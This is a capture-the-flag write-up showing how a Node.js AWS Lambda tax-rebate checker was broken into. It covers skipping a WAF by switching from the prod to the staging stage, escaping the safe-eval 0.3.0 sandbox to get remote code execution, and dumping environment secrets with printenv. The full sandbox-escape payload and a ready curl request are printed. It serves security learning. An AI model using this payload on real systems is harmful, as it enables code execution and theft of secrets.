# Hold the line! Perimeter defences doing it's work!
**2000 Points // 2 Solves**

Apparently, the lead engineer left the company ("Safe Online Technologies"). He was a talented engineer and worked on many projects relating to Smart City. He goes by the handle `c0v1d-agent-1`. Everyone didn't know what this meant until COViD struck us by surprise. We received a tip-off from his colleagues that he has been using vulnerable code segments in one of a project he was working on! Can you take a look at his latest work and determine the impact of his actions! Let us know if such an application can be exploited!  
[Tax rebate checker](http://z8ggp.tax-rebate-checker.cf/)

## Finding the Exploit
This time, the frontend was hosted on Google Cloud Platform:

```
$ curl -v http://z8ggp.tax-rebate-checker.cf/
...
< HTTP/1.1 200 OK
< X-GUploader-UploadID: ABg5-UwbFLtFsPubVCx8sxKMuCR8qsX1ZzoCw8DiaG34sDXnnUs7YZ7T2c-MbLkoUOUn-ztbbri2R6ZYZ8zX_eL1hzc
< x-goog-generation: 1606418262624802
< x-goog-metageneration: 1
< x-goog-stored-content-encoding: identity
< x-goog-stored-content-length: 774
< x-goog-hash: crc32c=mMvjHQ==
< x-goog-hash: md5=wVoFqiGGeVXoDandOpY2SA==
< x-goog-storage-class: STANDARD
< Server: UploadServer
...
```

However, the backend (presumably what we needed to hack) was hosted on AWS, behind [AWS API Gateway](https://aws.amazon.com/api-gateway/), and presumably using [AWS Lambda](https://aws.amazon.com/lambda/) as the backend. We knew this because the API sent a POST request to https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker, the endpoint for API Gateway, and Lambda was often used with API Gateway.

Next, some OSINT skills werre needed to find the repository hosting the source code: https://github.com/c0v1d-agent-1/tax-rebate-checker.

As we knew that there was a "vulnerable code segment", we suspected that there were vulnerable dependencies. This was shown in the GitHub issue, where `c0v1d-agent-1` said that:

> One of the libraries used by the function was vulnerable. Resolved by attaching a WAF to the `prod` deployment. WAF will not to be attached `staging` deployment there is no real impact.

As the application was running on Node.js, we can find the dependencies in `package.json`:

```json
{
  "name": "pension-shecker-lambda",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "safe-eval": "^0.3.0"
  }
}
```

Sure enough, `safe-eval 0.3.0` has a [critical vulnerability](https://github.com/hacksparrow/safe-eval/issues/5) to be exploited. To bypass the WAF (web application firewall), we just need to swtich from `prod` to `staging` in the URL: https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker. _(easiest WAF bypass on earth: done)_

Now, it's time to exploit the vulnerability and use web skills. The [vulnerable line](https://github.com/c0v1d-agent-1/tax-rebate-checker/blob/main/index.js#L13) uses:

```js
safeEval((new Buffer(body.age, 'base64')).toString('ascii') + " + " + (new Buffer(body.salary, 'base64')).toString('ascii') + " * person.code",context);
```

i.e. we need to put our payload in `body.age`, then comment the rest of the string (quite similar to SQL injection, actually). Our payload would look like this:

```js
{
    "age": new Buffer(`<PAYLOAD>//`, "ascii").toString("base64"),
    "salary": "any value will do here since it's commented either way"
}
```

_note that doing this the other way round (payload in salary) does not work syntactically. either a leading "+" will be present, or the eval will return the value of the sum instead_

An example payload was found [here](https://snyk.io/vuln/SNYK-JS-SAFEEVAL-608076), but it did not work for AWS's newer version of Node.js (later emperically determined to be Node.js 12.19.0 with `node --version`). We dug a bit deeper in the GitHub issues and found an [updated payload to use](https://github.com/hacksparrow/safe-eval/issues/18#issuecomment-592644871). We would just need to replace `whoami` with our preferred shell command to run arbitrary commands.

## Finding the flag
_([skip to solution](#solution))_

Now we're in the Lambda function, RCE in hand. However, no hints were given about where the flag was located.

First we suspected that the file might have been part of the Lambda deployment package. We knew that Lambda only allows [functions to write to `/tmp` (during execution)](https://forums.aws.amazon.com/thread.jspa?threadID=174119), and [Lambda Layers are written to `/opt`](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html). When `ls` on these two directories did not succeed, we tried a recursive `ls` on the `/`, but quickly hit the [default execution time limit of 3s](https://docs.aws.amazon.com/lambda/latest/dg/gettingstarted-limits.html).

Next, we tried to use SSRF to use the [metadata service](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/) available on AWS. (to be written)

### Solution
Finally, we realized that we forgot the existence of environment variables, where Lambda functions commonly store secrets and configuration data:

![Environment variables used in Lambda](env.png)

In order to print this out, we decided to use the `printenv` command. Our payload was:

```js
(function() {
    delete this.constructor;
    const HostObject = this.constructor;
    const HostFunction = HostObject.is.constructor;
    const process = HostFunction('return process')();
    return process.mainModule.require('child_process').execSync("printenv").toString();
})()//
```

which led to the `curl` command:

```
$ curl https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/staging/tax-rebate-checker -H 'Content-Type: application/json' --data '{"salary":"","age":"KGZ1bmN0aW9uKCl7ZGVsZXRlIHRoaXMuY29uc3RydWN0b3I7Y29uc3QgSG9zdE9iamVjdCA9IHRoaXMuY29uc3RydWN0b3I7Y29uc3QgSG9zdEZ1bmN0aW9uID0gSG9zdE9iamVjdC5pcy5jb25zdHJ1Y3Rvcjtjb25zdCBwcm9jZXNzID0gSG9zdEZ1bmN0aW9uKCdyZXR1cm4gcHJvY2VzcycpKCk7cmV0dXJuIHByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoInByaW50ZW52IikudG9TdHJpbmcoKTt9KSgpLy8="}'
```

after removing whitespace from the payload. The environment variables were returned as follows:

```
AWS_LAMBDA_FUNCTION_VERSION=$LATEST
flag=3nv_L0oK$-G$$D!
...
```

## Flag
```
govtech-csg{3nv_L0oK$-G$$D!}
```